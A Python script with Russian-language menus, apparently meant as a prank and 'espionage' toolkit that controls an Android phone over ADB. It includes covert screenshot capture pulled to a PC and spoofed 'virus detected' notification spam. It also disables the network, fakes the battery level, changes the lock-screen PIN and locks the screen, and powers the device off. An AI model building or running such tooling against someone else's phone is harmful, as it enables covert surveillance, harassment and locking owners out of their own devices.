import os
import subprocess
import sys
import time
import random

# --- 📁 ПАПКИ В КОРНЕ ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "screenshots")

def ensure_dirs():
    if not os.path.exists(SCREENSHOTS_DIR):
        os.makedirs(SCREENSHOTS_DIR)

# --- ЦВЕТА ---
class C:
    H = '\033[95m'
    B = '\033[94m'
    CY = '\033[96m'
    G = '\033[92m'
    W = '\033[93m'
    F = '\033[91m'
    E = '\033[0m'
    BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def adb(cmd):
    result = subprocess.run(f"adb {cmd}", shell=True, capture_output=True, text=True)
    return result.stdout.strip() + result.stderr.strip()

def check_connection():
    out = adb("devices")
    for line in out.split('\n'):
        if line.strip().endswith("device"):
            return True
    return False

def pause():
    input(f"\n{C.W}Нажми Enter, чтобы вернуться в меню...{C.E}")

# ==========================================
# 🕵️ ШПИОНАЖ И ИНФОРМАЦИЯ
# ==========================================

def active_app():
    print(f"\n{C.CY}[*] Проверяю активное окно...{C.E}")
    out = adb("shell dumpsys activity activities | grep mResumedActivity")
    if "u0 " in out:
        app = out.split("u0 ")[1].split("/")[0]
        print(f"{C.G}[+] Сейчас открыто: {C.BOLD}{app}{C.E}")
    else:
        print(f"{C.F}[!] Не удалось определить.{C.E}")
    pause()

def silent_photo():
    print(f"\n{C.CY}[*] Делаю скрытый снимок (через камеру или скриншот)...{C.E}")
    adb("shell input keyevent 27")
    time.sleep(2)
    # 🔧 Сохраняем сразу на ПК/локально в screenshots/
    local_path = os.path.join(SCREENSHOTS_DIR, "spy_shot.png")
    adb("shell screencap -p /sdcard/tmp_spy.png")
    adb(f"pull /sdcard/tmp_spy.png \"{local_path}\"")
    adb("shell rm /sdcard/tmp_spy.png")
    print(f"{C.G}[+] Снимок сохранен: {local_path}{C.E}")
    pause()

# ==========================================
# 😈 ПРАНКИ И БЕЗУМИЕ
# ==========================================

def poltergeist():
    print(f"\n{C.F}{C.BOLD}[!] ПОЛТЕРГЕЙСТ (Ctrl+C для стопа){C.E}")
    try:
        while True:
            size = adb("shell wm size").split(":")[-1].strip().split("x")
            w, h = int(size[0]), int(size[1])
            x, y = random.randint(100, w-100), random.randint(200, h-200)
            adb(f"shell input tap {x} {y}")
            time.sleep(0.2)
    except KeyboardInterrupt: print(f"\n{C.G}[+] Остановлено.{C.E}")

def tiktok_zombie():
    print(f"\n{C.F}{C.BOLD}[!] ТИКТОК-ЗОМБИ (Ctrl+C для стопа){C.E}")
    try:
        while True:
            size = adb("shell wm size").split(":")[-1].strip().split("x")
            w, h = int(size[0]), int(size[1])
            adb(f"shell input swipe {w//2} {int(h*0.8)} {w//2} {int(h*0.2)} 150")
            time.sleep(0.1)
    except KeyboardInterrupt: print(f"\n{C.G}[+] Остановлено.{C.E}")

def rotation_madness():
    print(f"\n{C.F}{C.BOLD}[!] ВРАЩЕНИЕ ЭКРАНА (Ctrl+C для стопа){C.E}")
    adb("shell settings put system accelerometer_rotation 0")
    try:
        while True:
            adb("shell settings put system user_rotation 1")
            time.sleep(0.4)
            adb("shell settings put system user_rotation 3")
            time.sleep(0.4)
    except KeyboardInterrupt:
        adb("shell settings put system user_rotation 0")
        print(f"\n{C.G}[+] Остановлено.{C.E}")

def change_dpi():
    print(f"\n{C.B}1. Бабушкин телефон (800) | 2. Муравей (200) | 3. Сброс{C.E}")
    ch = input(f"{C.B}Выбор: {C.E}")
    if ch == '1': adb("shell wm density 800")
    elif ch == '2': adb("shell wm density 200")
    elif ch == '3': adb("shell wm density reset")
    print(f"{C.G}[+] DPI изменен.{C.E}")
    pause()

def rickroll():
    adb('shell am start -a android.intent.action.VIEW -d "https://youtu.be/dQw4w9WgXcQ"')
    print(f"{C.G}[+] Рикролл запущен.{C.E}")
    pause()

def notification_spam():
    print(f"\n{C.CY}[*] Отправляю фейковые уведомления...{C.E}")
    for _ in range(10):
        adb('shell cmd notification post -S bigtext -t "СИСТЕМА" "Tag" "ОБНАРУЖЕН ВИРУС! 😈"')
        time.sleep(0.5)
    print(f"{C.G}[+] Готово.{C.E}")
    pause()

def network_killer():
    print(f"\n{C.F}[*] Отключаю Wi-Fi и мобильный интернет...{C.E}")
    adb("shell svc wifi disable")
    adb("shell svc data disable")
    print(f"{C.G}[+] Сеть отключена.{C.E}")
    pause()

def fake_battery():
    print(f"\n{C.F}{C.BOLD}[!] ФЕЙК ПРОЦЕНТОВ БАТАРЕИ{C.E}")
    try:
        percent = int(input(f"{C.W}Введи фейковый процент (0-100): {C.E}"))
        if not (0 <= percent <= 100):
            print(f"{C.F}[!] Нужно число от 0 до 100.{C.E}")
            pause()
            return
        adb("shell dumpsys battery unplug")
        adb(f"shell dumpsys battery set level {percent}")
        print(f"{C.G}[+] Телефон теперь показывает {C.BOLD}{percent}%{C.E}")
        print(f"{C.W}[i] Реальный заряд не меняется, только отображение.{C.E}")
    except ValueError:
        print(f"{C.F}[!] Ошибка ввода. Нужно число.{C.E}")
    pause()

def reset_battery():
    print(f"\n{C.CY}[*] Сбрасываю фейковый процент...{C.E}")
    adb("shell dumpsys battery reset")
    print(f"{C.G}[+] Батарея вернулась к реальным значениям.{C.E}")
    pause()

# ==========================================
# ⚙️ НАСТРОЙКИ И УТИЛИТЫ
# ==========================================

def autoclicker():
    print(f"\n{C.CY}=== АВТОКЛИКЕР ==={C.E}")
    x = input("Координата X: ")
    y = input("Координата Y: ")
    delay = input("Интервал (сек, напр. 0.5): ")
    count = input("Сколько раз (0 = бесконечно): ")
    try:
        delay, count = float(delay), int(count)
        i = 0
        print(f"{C.F}[!] Кликаю... (Ctrl+C для стопа){C.E}")
        while True:
            adb(f"shell input tap {x} {y}")
            i += 1
            if count > 0 and i >= count: break
            time.sleep(delay)
    except KeyboardInterrupt: pass
    except ValueError: print(f"{C.F}Ошибка ввода!{C.E}")
    print(f"\n{C.G}[+] Сделано кликов: {i}{C.E}")

def hacker_ui(status=True):
    if status:
        adb("shell settings put system show_touches 1")
        adb("shell settings put system pointer_location 1")
        print(f"{C.G}[+] Hacker UI Включен.{C.E}")
    else:
        adb("shell settings put system show_touches 0")
        adb("shell settings put system pointer_location 0")
        print(f"{C.G}[+] Hacker UI Выключен.{C.E}")
    pause()

# ==========================================
# ☠️ ОПАСНАЯ ЗОНА
# ==========================================

def change_pin():
    print(f"\n{C.F}{C.BOLD}⚠️ СМЕНА PIN-КОДА ЭКРАНА ⚠️{C.E}")
    new_pin = input(f"{C.W}Введи новый PIN (4 цифры): {C.E}")
    if len(new_pin) == 4 and new_pin.isdigit():
        adb(f"shell locksettings set-pin {new_pin}")
        print(f"{C.F}[!] PIN изменен на {new_pin}. Экран заблокирован!{C.E}")
        adb("shell input keyevent 26")
    else:
        print(f"{C.F}[!] Ошибка. Нужно 4 цифры.{C.E}")
    pause()

def kernel_panic():
    print(f"\n{C.F}{C.BOLD}☠️ KERNEL PANIC (ВЫКЛЮЧЕНИЕ) ☠️{C.E}")
    if input(f"{C.W}Введи 'PANIC' для подтверждения: {C.E}") == 'PANIC':
        adb("shell reboot -p")
        sys.exit()

# ==========================================
# МЕНЮ
# ==========================================

def main():
    ensure_dirs()  # 🔧 создаём screenshots/ при запуске
    if not check_connection():
        print(f"{C.F}[!] Ошибка: Телефон не подключен!{C.E}")
        sys.exit()

    while True:
        clear()
        print(f"{C.CY}{C.BOLD}=== CYBERDECK: ALL-IN-ONE TOOLS ==={C.E}")

        print(f"\n{C.B}--- 🕵️ ШПИОНАЖ ---{C.E}")
        print("1. Какое приложение открыто?")
        print("2. Скрытый снимок")

        print(f"\n{C.W}--- 😈 ПРАНКИ ---{C.E}")
        print("3. Полтергейст (Тыкает экран)")
        print("4. Тикток-Зомби (Скроллит)")
        print("5. Бешеное вращение экрана")
        print("6. Изменить DPI (Размер)")
        print("7. Рикролл")
        print("8. Спам уведомлениями")
        print("9. Отключить интернет (Kill Net)")
        print("10. Фейк процентов батареи")
        print("11. Сбросить фейк процентов")

        print(f"\n{C.CY}--- ⚙️ УТИЛИТЫ ---{C.E}")
        print("12. Автокликер")
        print("13. Hacker UI Вкл/Выкл")

        print(f"\n{C.F}--- ☠️ ОПАСНАЯ ЗОНА ---{C.E}")
        print("14. Сменить PIN-код экрана")
        print("15. Kernel Panic (Выключить)")

        print(f"\n{C.F}0. Выход{C.E}")

        choice = input(f"\n{C.BOLD}Выбор: {C.E}")

        if choice == '1': active_app()
        elif choice == '2': silent_photo()
        elif choice == '3': poltergeist()
        elif choice == '4': tiktok_zombie()
        elif choice == '5': rotation_madness()
        elif choice == '6': change_dpi()
        elif choice == '7': rickroll()
        elif choice == '8': notification_spam()
        elif choice == '9': network_killer()
        elif choice == '10': fake_battery()
        elif choice == '11': reset_battery()
        elif choice == '12': autoclicker()
        elif choice == '13': hacker_ui(True)
        elif choice == '14': change_pin()
        elif choice == '15': kernel_panic()
        elif choice == '0': break

if __name__ == "__main__":
    main()
